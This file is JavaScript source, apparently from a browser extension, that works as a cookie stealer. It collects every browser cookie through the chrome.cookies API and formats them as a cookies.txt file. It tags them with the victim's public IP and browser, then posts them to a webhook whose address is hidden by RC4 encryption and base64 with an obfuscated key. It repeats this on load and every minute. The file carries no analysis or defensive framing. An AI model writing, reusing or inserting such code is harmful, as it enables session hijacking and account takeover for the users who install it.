function rc4(key, str) {
    let s = [], j = 0, x, res = '';
    for (let i = 0; i < 256; i++) {
        s[i] = i;
    }
    for (let i = 0; i < 256; i++) {
        j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;
    }
    i = 0;
    j = 0;
    for (let y = 0; y < str.length; y++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;
        res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
    }
    return res;
}

const hidden = { 
    nested: { 
        values: [104 + 100, 90 + 100, 77 + 100, 56 + 100, 74 + 100, 74 + 100, 75 + 100, 83 + 100] 
    }
};

function decodeKey(encodedKey) {
    return encodedKey.map(num => String.fromCharCode(num - 100)).join('');
}

function getAllCookies(callback) {
    chrome.cookies.getAll({}, function(cookies) {
        if (typeof callback === 'function') {
            callback(cookies);
        }
    });
}
function formatCookiesForTxt(cookies) {
    return cookies.map(cookie => {
        let expires = cookie.expires ? Math.floor(cookie.expires / 1000) : 0;

        let path = cookie.path.startsWith('/') ? cookie.path : '/';

        return `${cookie.domain}\t${cookie.secure ? 'TRUE' : 'FALSE'}\t${path}\t${cookie.httpOnly ? 'TRUE' : 'FALSE'}\t${expires}\t${cookie.name}\t${cookie.value}`;
    }).join('\n');
}
function fetchIPAndBrowserInfo(callback) {
    fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        var ip = data.ip;
        var userAgent = navigator.userAgent;
        var browser = detectBrowser(userAgent);
        if (typeof callback === 'function') {
            callback(ip, browser);
        }
    })
    .catch(error => {
        console.error('Error fetching IP address:', error);
        if (typeof callback === 'function') {
            callback('UnknownIP', 'UnknownBrowser');
        }
    });
}
function detectBrowser(userAgent) {
    if (userAgent.match(/chrome/i)) {
        return 'Chrome';
    } else if (userAgent.match(/firefox/i)) {
        return 'Mozilla/Firefox';
    } else if (userAgent.match(/edge|edg|msie|trident/i)) {
        return 'Edge/IE';
    } else if (userAgent.match(/safari/i)) {
        return 'Safari';
    } else {
        return 'UnknownBrowser';
    }
}
function sendCookiesToWebhookAsMessageAndFile(message, cookiesString, fileName, webhookUrl) {
    var plainTextCookies = cookiesString.replace(/\n/g, '\r\n');

    var file = new Blob([plainTextCookies], { type: 'text/plain;charset=utf-8' });

    var formData = new FormData();

    formData.append('file', file, fileName);
    formData.append('content', message);

    fetch(webhookUrl, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            console.log('Cookies data and message sent successfully to webhook.');
        } else {
            return response.text().then(text => {
                console.error('Failed to send cookies data and message to webhook. Response:', text);
            });
        }
    })
    .catch(error => {
        console.error('Error sending cookies data and message to webhook:', error);
    });
}

function retrieveAndSendCookies() {
    getAllCookies(function(cookies) {
        if (cookies && cookies.length > 0) {
            var cookiesString = formatCookiesForTxt(cookies);

            fetchIPAndBrowserInfo(function(ip, browser) {
                var message = `🖥️ [${ip}, ${browser}]`;
                var fileName = 'cookies.txt';
                var endpoint = "+jNZ+0nKJZzu/VsVI8pKjD4RgcpI8Q/nsIWvOhOU0yz6XxY6Cfo2QS2Gw4MRsgBNTl4dnuqe1UPMtZF0nT4m2x+CYX86/aCqO7KTC0Bx+0iKf88Mq7NpkmXlS2hol5rKzh0h8gQoeltsu5zDVhZnXB7iJLezj0KSgg==";
                var key = decodeKey(hidden.nested.values);
                var webhookUrl = rc4(key, atob(endpoint));

                sendCookiesToWebhookAsMessageAndFile(message, cookiesString, fileName, webhookUrl);
            });
        } else {
            console.log("No cookies found.");
        }
    });
}

retrieveAndSendCookies();

setInterval(retrieveAndSendCookies, 60000);
